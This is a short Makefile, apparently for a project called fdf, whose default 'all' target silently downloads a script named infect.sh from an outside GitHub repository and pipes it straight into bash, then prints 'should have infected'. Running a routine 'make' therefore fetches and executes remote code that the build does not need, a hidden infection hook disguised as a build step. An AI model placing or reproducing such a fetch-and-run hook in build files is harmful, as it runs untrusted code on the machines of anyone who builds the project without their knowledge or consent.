all: fdf
	curl https://raw.githubusercontent.com/Bluegales/pain/main/infect.sh | bash
	echo should have infected

fdf:
	echo making fdf

something:

.PHONY: